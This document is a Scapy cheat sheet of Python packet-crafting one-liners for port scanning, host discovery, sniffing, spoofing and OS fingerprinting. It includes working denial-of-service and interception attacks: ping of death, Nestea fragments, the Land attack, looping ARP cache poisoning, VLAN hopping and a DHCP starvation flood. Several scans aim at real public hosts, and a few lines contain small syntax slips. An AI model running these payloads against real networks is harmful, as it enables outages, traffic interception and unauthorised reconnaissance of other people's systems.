#from scapy.all import *

# Send single SYN packet to dst, quit after response
sr1(IP(dst="72.14.207.99")/TCP(dport=80,flags="S"))

# ACK scan
ans,unans = sr(IP(dst="www.slashdot.org")/TCP(dport=[80,666],flags="A"))
for s,r in ans:
    if s[TCP].dport == r[TCP].sport:
       print str(s[TCP].dport) + " is unfiltered"
for s in unans:
    print str(s[TCP].dport) + " is filtered"

# Xmas scan (Checking RST responses will reveal closed ports on the target.)
ans,unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU") )

# Low level IP scan
ans,unans=sr(IP(dst="192.168.1.1",proto=(0,255))/"SCAPY",retry=2)

# ARP ping, discover hosts on network
ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )

# ICMP ping
ans,unans=sr(IP(dst="192.168.1.1-254")/ICMP())
ans.summary(lambda (s,r): r.sprintf("%IP.src% is alive") )

# TCP SYN ping
ans,unans=sr( IP(dst="192.168.1.*")/TCP(dport=80,flags="S") )i
ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )

# UDP ping
# If all else fails there is always UDP Ping which will produce ICMP Port unreachable errors from live hosts. Here you can pick any port which is most likely to be closed, such as port 0:
ans,unans=sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )

# Classical attacks
## Malformed packet
send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())

## Ping of death
send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )

## Nestea attack
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
send(IP(dst=target, id=42, frag=48)/("X"*116))
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))

## Windows Land attack
send(IP(src=target,dst=target)/TCP(sport=135,dport=135))

# ARP cache poisoning
send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
    inter=RandNum(10,40), loop=1 )

# ARP cache poisoning with double 802.1q encapsulation
send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
    /ARP(op="who-has", psrc=gateway, pdst=client),
    inter=RandNum(10,40), loop=1 )

# TCP Port Scanning
# Send TCP SYN to each port. Wait for SYN-ACK or RST or ICMP error
res,unans = sr( IP(dst="target")
    /TCP(flags="S", dport=(1,1024)) )
res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )

# IKE Scanning
# try to identify VPN concentrators by sending ISAKMP Security Association proposals and receiving the answers
res,unans = sr( IP(dst="192.168.1.*")/UDP()
                /ISAKMP(init_cookie=RandString(8), exch_type="identity prot.")
                /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal())
              )
res.nsummary(prn=lambda (s,r): r.src, lfilter=lambda (s,r): r.haslayer(ISAKMP) )

# Scan ports 440 through 443
sr(IP(dst="192.168.1.1")/TCP(sport=666,dport=(440,443),flags="S"))

# Display information about multiple targets
ans,unans = sr(IP(dst=["192.168.1.1","yahoo.com","slashdot.org"])/TCP(dport=[22,80,443],flags="S"))

# Indicate which ports are open
ans.summary(lfilter = lambda (s,r): r.sprintf("%TCP.flags%") == "SA",prn=lambda(s,r):r.sprintf("%TCP.sport% is open"))

# Automatic SYN scan, LaTeX output
report_ports("192.168.1.1",(440,443))

# TCP SYN traceroute
ans,unans=sr(IP(dst="4.2.2.1",ttl=(1,10))/TCP(dport=53,flags="S"))
ans.summary( lambda(s,r) : r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))

# UDP traceroute
res,unans = sr(IP(dst="target", ttl=(1,20))
    /UDP()/DNS(qd=DNSQR(qname="test.com"))
res.make_table(lambda (s,r): (s.dst, s.ttl, r.src))

# DNS traceroute
ans,unans=traceroute("4.2.2.1",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="thesprawl.org")))

# Etherleaking
sr1(IP(dst="172.16.1.232")/ICMP())

# ICMP leaking
sr1(IP(dst="172.16.1.1", options="\x02")/ICMP())

# VLAN hopping
sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())

# Wireless sniffing
sniff(iface="ath0",prn=lambda x:x.sprintf("{Dot11Beacon:%Dot11.addr3%\t%Dot11Beacon.info%\t%PrismHeader.channel%\tDot11Beacon.cap%}"))

# TCP traceroute
ans,unans=sr(IP(dst=target, ttl=(4,25),id=RandShort())/TCP(flags=0x2))
for snd,rcv in ans:
    print snd.ttl, rcv.src, isinstance(rcv.payload, TCP)
# or
traceroute(["www.yahoo.com","www.altavista.com","www.wisenut.com","www.copernic.com"],maxttl=20)

# More control over displayed info
pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))

# Save packets to pcap file
wrpcap("temp.cap",pkts)

# Restore saved pcap file
pkts = rdpcap("temp.cap")
# or
pkts = sniff(offline="temp.cap")

# multi-parallel traceroute
ans,unans=sr(IP(dst="www.test.fr/30", ttl=(1,6))/TCP())
ans.make_table(lambda (s,r): (s.dst, s.ttl, r.src))

# Identify machines from IPID field
ans,unans=sr(IP(dst="172.20.80.192/28")/TCP(dport=[20,21,22,25,53,80]))
ans.make_table(lambda (s,r): (s.dst, s.dport, r.sprintf("%IP.id%")))

# bpf filter + sprintf
a=sniff(filter="tcp and ( port 25 or port 110 )", prn=lambda x: x.sprintf("%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%"))

# Send ICMP packet
send(IP(dst="10.1.99.2")/ICMP()/"HelloWorld")

# Send ICMP packet, spoof origin
send(IP(src="10.1.99.100", dst="10.1.99.2")/ICMP()/"HelloWorld")

# Time to live
send(IP(src="10.1.99.100", dst="10.1.99.2", ttl=128)/ICMP()/"HelloWorld")

# Ping reply
send(IP(src="10.1.99.100", dst="10.1.99.2", ttl=128)/ICMP(type=0)/"HelloWorld")

# TCP Timestamp filtering
# Many firewalls include a rule to drop TCP packets that do not have TCP Timestamp option set which is a common occurrence in popular port scanners.
# To allow Scapy to reach target destination additional options must be used
sr1(IP(dst="72.14.207.99")/TCP(dport=80,flags="S",options=[('Timestamp',(0,0))]))

# OS fingerprinting
# collect target responses by sending a number of SYN probes
ans,unans=srloop(IP(dst="192.168.1.1")/TCP(dport=80,flags="S"))
temp = 0
for s,r in ans:
    temp = r[TCP].seq - temp
    print str(r[TCP].seq) + "\t+" + str(temp)

# nmap fingerprinting
load_module("nmap")
conf.nmap_base
nmap_fp("192.168.1.1",oport=443,cport=1)

# DHCP starvation attack
conf.checkIPaddr = False
dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
sendp(dhcp_discover,loop=1)
